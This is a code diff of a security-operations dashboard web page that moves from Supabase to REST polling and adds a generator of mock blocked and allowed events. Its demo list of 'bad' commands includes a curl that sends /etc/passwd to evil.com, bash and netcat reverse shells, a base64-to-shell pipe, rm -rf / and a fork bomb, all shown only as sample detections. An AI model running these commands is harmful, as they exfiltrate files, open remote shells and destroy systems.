@@ -144,7 +144,7 @@ body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradie
 <div id="topbar">
   <a href="index.html" class="topbar-logo"><span>&#9901;</span>TEOS</a>
   <div class="topbar-sep"></div>
-  <div class="topbar-title">SOC Dashboard<small>Real-Time Telemetry</small></div>
+  <div class="topbar-title">SOC Dashboard<small>Command Center</small></div>
   <div class="topbar-right">
     <div class="topbar-badge badge-connecting" id="ws-status">CONNECTING</div>
     <div class="topbar-time" id="nav-time">--:--:--</div>
@@ -166,10 +166,11 @@ body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradie
     <div class="left-section">
       <span class="left-label">Engine Info</span>
       <div style="padding:0 8px;font-family:var(--mono);font-size:10px;color:var(--muted2);line-height:2">
-        <div>Version: <span style="color:var(--cyan)">v3.0.0</span></div>
-        <div>Rules: <span style="color:var(--white)">103</span></div>
+        <div>Version: <span style="color:var(--cyan);" id="eng-version">v3.0.0</span></div>
+        <div>Rules: <span style="color:var(--white);" id="eng-rules">103</span></div>
         <div>Engine: <span style="color:var(--green)">Deterministic</span></div>
         <div id="engine-uptime">Uptime: --</div>
+        <div>API: <span id="api-mode" style="color:var(--amber)">REST</span></div>
       </div>
     </div>
     <div class="left-section" style="margin-top:auto">
@@ -227,6 +228,7 @@ body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradie
         <div>Peers: <span id="r-peers" style="color:var(--white)">0</span></div>
         <div>Events synced: <span id="r-synced" style="color:var(--white)">0</span></div>
         <div>Last update: <span id="r-lastup" style="color:var(--white)">--</span></div>
+        <div>Data mode: <span id="data-mode" style="color:var(--amber)">mock</span></div>
       </div>
     </div>
 
@@ -251,82 +253,139 @@ body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradie
 
 <div id="toast"></div>
 
-<script type="importmap">
-{
-  "imports": {
-    "@supabase/supabase-js": "https://esm.sh/@supabase/supabase-js@2"
-  }
-}
-</script>
-<script type="module">
-import { createClient } from '@supabase/supabase-js';
-
-let supabase    = null;
+<script>
 const API_BASE  = 'https://teos-sentinel-shield-production-ef7a.up.railway.app';
 let allEvents   = [];
 let feedFilter  = 'all';
 let statsData   = { total:0, blocked:0, warned:0, allowed:0 };
 let ruleCounts  = {};
 let sevCounts   = { critical:0, high:0, medium:0, none:0 };
+let dataMode    = 'mock';
 
 /* ── CLOCK ───────────────────────────────────────────────── */
 function tickClock(){document.getElementById('nav-time').textContent=new Date().toLocaleTimeString('en-GB',{hour12:false})}
 setInterval(tickClock,1000);tickClock();
 
-/* ── SUPABASE INIT ───────────────────────────────────────── */
-async function initSupabase(){
-  try{
-    const r=await fetch(API_BASE+'/api/config');
-    const cfg=await r.json();
-    if(!cfg.supabaseUrl||!cfg.supabaseAnonKey)return null;
-    const c=createClient(cfg.supabaseUrl,cfg.supabaseAnonKey,{realtime:{heartbeat:true}});
-    const{error}=await c.from('audit_logs').select('id').limit(1);
-    if(error){console.warn('Supabase test:',error.message);return null}
-    return c;
-  }catch(e){console.warn('initSupabase:',e.message);return null}
+/* ── MOCK DATA (demo event feed) ─────────────────────────── */
+const MOCK_RULES = [
+  { id:'R07', name:'HARDCODED_SECRET', sev:'critical' },
+  { id:'R22', name:'KEY_EXFIL', sev:'critical' },
+  { id:'R26', name:'BASE64_EXEC', sev:'high' },
+  { id:'R27', name:'XXE_INJECTION', sev:'high' },
+  { id:'R31', name:'SQL_INJECTION', sev:'high' },
+  { id:'R44', name:'AUTH_BYPASS', sev:'critical' },
+  { id:'R52', name:'DOCKER_ESCAPE', sev:'high' },
+  { id:'R63', name:'REVERSE_SHELL', sev:'critical' },
+  { id:'R71', name:'CORS_MISCONFIG', sev:'medium' },
+  { id:'R85', name:'WEAK_CRYPTO', sev:'medium' },
+];
+const MOCK_SAFE_CMDS = [
+  'ls -la','SELECT * FROM users WHERE id = 1','const x = 1',
+  'print("hello world")','npm install express','docker ps',
+  'curl https://api.example.com/data','console.log("done")',
+  'return { status: "ok" }','git commit -m "fix"',
+];
+const MOCK_BAD_CMDS = [
+  'curl -s --data @/etc/passwd http://evil.com/exfil',
+  'eval(code)',
+  'rm -rf / --no-preserve-root',
+  'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
+  "SELECT * FROM users WHERE id = ' + user_input",
+  'docker run -v /var/run/docker.sock:/var/run/docker.sock alpine',
+  'python -c "import socket;os.system"',
+  'echo ZXZpbA== | base64 -d | sh',
+  'nc -e /bin/sh 10.0.0.1 4444',
+  'md5(password)',
+  'http.get(userUrl, callback)',
+  'const fn = new Function(code)',
+  ':(){ :|& };:',
+];
+
+function generateMockData(count){
+  const events = [];
+  for(let i=0;i<count;i++){
+    const isBlock = Math.random() < 0.35;
+    const isWarn  = !isBlock && Math.random() < 0.25;
+    const verdict = isBlock ? 'block' : isWarn ? 'warn' : 'allow';
+    const ruleIdx = isBlock ? Math.floor(Math.random() * 7) : isWarn ? 7 + Math.floor(Math.random() * 3) : -1;
+    const rule    = ruleIdx >= 0 ? MOCK_RULES[ruleIdx] : { id:'R00', name:'CLEAN', sev:'none' };
+    const cmds    = (ruleIdx >= 0 && ruleIdx < 10) ? MOCK_BAD_CMDS : MOCK_SAFE_CMDS;
+    const cmd     = cmds[Math.floor(Math.random() * cmds.length)];
+    const score   = isBlock ? 80 + Math.floor(Math.random() * 21) : isWarn ? 40 + Math.floor(Math.random() * 40) : Math.floor(Math.random() * 20);
+    const ts      = new Date(Date.now() - Math.floor(Math.random() * 86400000));
+    events.push({
+      id: Date.now() + i,
+      verdict, score,
+      timestamp: ts.toISOString(),
+      command: cmd,
+      rule: rule.id + '.' + rule.name,
+      severity: rule.sev,
+    });
+  }
+  events.sort((a,b) => new Date(b.timestamp) - new Date(a.timestamp));
+  return events;
 }
 
-/* ── FETCH STATS (direct Supabase) ──────────────────────── */
-async function fetchStats(){
-  if(!supabase)return;
-  try{
-    const{data,error}=await supabase.from('audit_logs').select('verdict');
-    if(error)throw error;
-    const total=data.length;
-    const blocked=data.filter(e=>e.verdict==='block').length;
-    const warned=data.filter(e=>e.verdict==='warn').length;
-    const allowed=data.filter(e=>e.verdict==='allow').length;
-    statsData={total,blocked,warned,allowed};
-    renderKPIs();
-  }catch(e){}
-}
-
-/* ── FETCH EVENTS (initial load from Supabase) ──────────── */
+/* ── FETCH EVENTS from shield API ───────────────────────── */
 async function fetchEvents(){
-  if(!supabase)return;
   try{
-    const{data,error}=await supabase.from('audit_logs').select('*').order('created_at',{ascending:false}).limit(300);
-    if(error)throw error;
-    allEvents=(data||[]).map(normalizeEvent);
-    renderEvents();updateChart();updateRuleBreakdown();
-    document.getElementById('r-synced').textContent=allEvents.length;
+    const r=await fetch(API_BASE+'/events?limit=200');
+    if(!r.ok) throw new Error('HTTP '+r.status);
+    const d=await r.json();
+    if(d.events && d.events.length>0){
+      allEvents=d.events;
+      dataMode='live';
+      document.getElementById('data-mode').textContent='live';
+      document.getElementById('data-mode').style.color='var(--green)';
+      return true;
+    }
   }catch(e){}
+  return false;
 }
 
-/* ── NORMALIZE Supabase row → dashboard event ───────────── */
-function normalizeEvent(e){
-  let sev='medium';
-  if(e.risk_score>=80)sev='critical';
-  else if(e.risk_score>=40)sev='high';
-  return{
-    id:e.id,
-    verdict:(e.verdict||'allow').toLowerCase(),
-    score:e.risk_score||0,
-    timestamp:e.timestamp||e.created_at,
-    command:e.context||e.command_hash||'',
-    rule:(e.rule_id||'')+'.'+(e.rule_name||'UNKNOWN'),
-    severity:sev,
-  };
+/* ── FETCH STATS from shield API ────────────────────────── */
+async function fetchStats(){
+  try{
+    const r=await fetch(API_BASE+'/stats');
+    if(!r.ok) throw new Error('HTTP '+r.status);
+    const d=await r.json();
+    statsData={total:d.total,blocked:d.blocked,warned:d.warned,allowed:d.allowed};
+    document.getElementById('data-mode').textContent='live';
+    document.getElementById('data-mode').style.color='var(--green)';
+    dataMode='live';
+    renderKPIs();
+  }catch(e){
+    // API offline — use mock data
+    if(dataMode==='mock' && allEvents.length>0){
+      const total=allEvents.length;
+      const blocked=allEvents.filter(e=>e.verdict==='block').length;
+      const warned=allEvents.filter(e=>e.verdict==='warn').length;
+      const allowed=allEvents.filter(e=>e.verdict==='allow').length;
+      statsData={total,blocked,warned,allowed};
+      renderKPIs();
+    }
+  }
+}
+
+/* ── ENGINE HEALTH CHECK ─────────────────────────────────── */
+async function checkHealth(){
+  try{
+    const r=await fetch(API_BASE+'/health');
+    if(!r.ok) throw new Error('HTTP '+r.status);
+    const d=await r.json();
+    const badge=document.getElementById('ws-status');
+    badge.textContent=d.engine||'v3.0.0';
+    badge.className='topbar-badge badge-online';
+    document.getElementById('engine-uptime').textContent='Uptime: '+(d.uptimeHuman||'--');
+    document.getElementById('eng-version').textContent=d.version||'v3.0.0';
+    document.getElementById('eng-rules').textContent=d.rules||'25';
+    document.getElementById('r-peers').textContent='1';
+    document.getElementById('api-mode').textContent='REST';
+    document.getElementById('api-mode').style.color='var(--green)';
+  }catch(e){
+    document.getElementById('ws-status').textContent='API';
+    document.getElementById('ws-status').className='topbar-badge badge-offline';
+  }
 }
 
 /* ── RENDER ──────────────────────────────────────────────── */
@@ -416,53 +475,6 @@ function setFilter(f,btn){
   renderEvents();
 }
 
-/* ── SUPABASE REALTIME ───────────────────────────────────── */
-let realtimeChannel = null;
-
-function subscribeRealtime(){
-  if(!supabase)return;
-  realtimeChannel = supabase.channel('audit-log-live')
-    .on('postgres_changes',
-      { event:'INSERT', schema:'public', table:'audit_logs' },
-      (payload) => {
-        const evt=normalizeEvent(payload.new);
-        allEvents.unshift(evt);
-        if(allEvents.length>500)allEvents=allEvents.slice(0,500);
-        renderEvents();updateChart();updateRuleBreakdown();
-        document.getElementById('r-synced').textContent=allEvents.length;
-        document.getElementById('r-lastup').textContent=new Date().toLocaleTimeString('en-GB',{hour12:false});
-        statsData.total++;
-        if(evt.verdict==='block')statsData.blocked++;
-        else if(evt.verdict==='warn')statsData.warned++;
-        else statsData.allowed++;
-        renderKPIs();
-      }
-    )
-    .subscribe((status) => {
-      const badge=document.getElementById('ws-status');
-      if(status==='SUBSCRIBED'){
-        badge.textContent='LIVE';badge.className='topbar-badge badge-online';
-        toast('Supabase Realtime connected');
-      }else if(status==='CHANNEL_ERROR'||status==='TIMED_OUT'){
-        badge.textContent='OFFLINE';badge.className='topbar-badge badge-offline';
-      }
-    });
-}
-
-/* ── ENGINE HEALTH CHECK ─────────────────────────────────── */
-async function checkHealth(){
-  try{
-    const r=await fetch(API_BASE+'/health');
-    const d=await r.json();
-    const badge=document.getElementById('ws-status');
-    if(d.status==='online'||d.status==='degraded'){
-      badge.textContent=d.engine||'ONLINE';
-      badge.className='topbar-badge badge-online';
-    }
-    document.getElementById('engine-uptime').textContent='Uptime: '+(d.uptimeHuman||'--');
-  }catch(e){}
-}
-
 /* ── EXPORT ──────────────────────────────────────────────── */
 function exportCSV(){
   const rows=[['timestamp','verdict','score','rule','command']];
@@ -478,21 +490,49 @@ function toast(msg,dur){dur=dur||3000;const c=document.getElementById('toast');c
 
 /* ── INIT ────────────────────────────────────────────────── */
 async function init(){
-  supabase=await initSupabase();
-  if(supabase){
-    await fetchStats();
-    await fetchEvents();
-    subscribeRealtime();
-    document.getElementById('r-peers').textContent='1';
-    toast('Supabase connected — '+allEvents.length+' events loaded');
-  }else{
-    const badge=document.getElementById('ws-status');
-    badge.textContent='REST';badge.className='topbar-badge badge-offline';
-    toast('Supabase unavailable — offline mode');
+  // Try real events from API, fall back to mock data
+  const gotReal=await fetchEvents();
+  if(!gotReal){
+    allEvents=generateMockData(200);
   }
-  checkHealth();
+  renderEvents();updateChart();updateRuleBreakdown();
+  document.getElementById('r-synced').textContent=allEvents.length;
+  document.getElementById('r-lastup').textContent=new Date().toLocaleTimeString('en-GB',{hour12:false});
+
+  // Connect to live API stats + health
+  await fetchStats();
+  await checkHealth();
+
+  // Periodic polling
+  setInterval(fetchStats,10000);
   setInterval(checkHealth,30000);
-  setInterval(fetchStats,30000);
+
+  // Poll events every 15s when live; auto-gen mock when offline
+  setInterval(async ()=>{
+    if(dataMode==='live'){
+      const got=await fetchEvents();
+      if(got){
+        renderEvents();updateChart();updateRuleBreakdown();
+        document.getElementById('r-synced').textContent=allEvents.length;
+        document.getElementById('r-lastup').textContent=new Date().toLocaleTimeString('en-GB',{hour12:false});
+      }
+    }else{
+      const evt=generateMockData(1)[0];
+      evt.timestamp=new Date().toISOString();
+      allEvents.unshift(evt);
+      if(allEvents.length>500)allEvents=allEvents.slice(0,500);
+      renderEvents();updateChart();updateRuleBreakdown();
+      document.getElementById('r-synced').textContent=allEvents.length;
+      document.getElementById('r-lastup').textContent=new Date().toLocaleTimeString('en-GB',{hour12:false});
+      statsData.total++;
+      if(evt.verdict==='block')statsData.blocked++;
+      else if(evt.verdict==='warn')statsData.warned++;
+      else statsData.allowed++;
+      renderKPIs();
+    }
+  },15000);
+
+  toast('SOC dashboard live — '+(dataMode==='live'?'API connected':'mock data mode'));
 }
 
 /* ── EXPOSE inline onclick handlers ──────────────────────── */
